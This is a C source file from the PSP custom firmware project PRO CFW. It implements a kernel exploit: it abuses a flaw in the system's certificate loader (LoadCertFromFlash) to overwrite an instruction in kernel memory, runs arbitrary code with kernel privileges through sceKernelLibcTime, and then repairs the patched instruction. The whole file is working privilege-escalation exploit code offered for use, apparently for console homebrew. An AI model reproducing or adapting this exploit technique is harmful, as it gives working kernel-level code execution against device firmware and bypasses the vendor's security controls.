/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <pspumd.h>
#include <module2.h>
#include <lflash0.h>
#include <macros.h>
#include <functions.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include "kxploit.h"

// Certificate Loading Exploit
#define CERTLOADER_BUF_OFFSET 0x5C
#define CERTLOADER_STRING_VULNERABILITY 0x490A0D30
#define CERTLOADER_WRITE_ADDR_OFFSET 0x440
#define CERTLOADER_BUF_SIZE 0x938

#define SCE_ERROR_OUT_OF_MEMORY   0x80000022

// libhttp.prx Stubs Mapping
int (* LoadCertFromFlash)(int, int, int, int, int, int) = NULL;

void (* KernelLibcTime)(int, int, int, int, int) = NULL;

// Load required Libraries for LoadCertFromFlash (HTTP and SSL Libraries)
int stubScanner()
{
		
	g_tbl->freeMem(g_tbl);
	
	// Load Modules via sceUtilityLoadModule (if available)
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);	// 0x100
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);	// 0x102
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_PARSEURI);	// 0x103
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_PARSEHTTP);	// 0x104
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_SSL);	// 0x106
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_HTTP);	// 0x105
	
	// Find PEM Certificate Loader in Memory
	LoadCertFromFlash = (void*)g_tbl->FindImportUserRam("sceCertLoader", 0xDD629A24);
	KernelLibcTime = (void*)(g_tbl->KernelLibcTime);

	return 0;
}

int doExploit(void)
{
	int ret, errCode = 0;

	void *buf = (void*)0x04010004;	// b 0x12
	
	void *output = buf - CERTLOADER_WRITE_ADDR_OFFSET;
	void *sysmemAddr = (void*)0x8800F768;
	
	// Set the Patch Target Address (jalr $a1 in sceKernelLibcTime)
	_sw((u32)(sysmemAddr - 4), CERTLOADER_STRING_VULNERABILITY + 4);
	
	ret = LoadCertFromFlash(0, 0, (unsigned int)output + CERTLOADER_BUF_OFFSET, (unsigned int)output, CERTLOADER_BUF_SIZE, 0);
	

	if ( ret != SCE_ERROR_OUT_OF_MEMORY )
	{
		errCode = -1;
	}
	
	return errCode;
}

void executeKernel(u32 kernelContentFunction)
{
	KernelLibcTime(0, 0, 0, 0, KERNELIFY(kernelContentFunction));
}

void repairInstruction(void)
{
	// Fix hacked Function
	_sw(NOP, 0x8800F768);
}
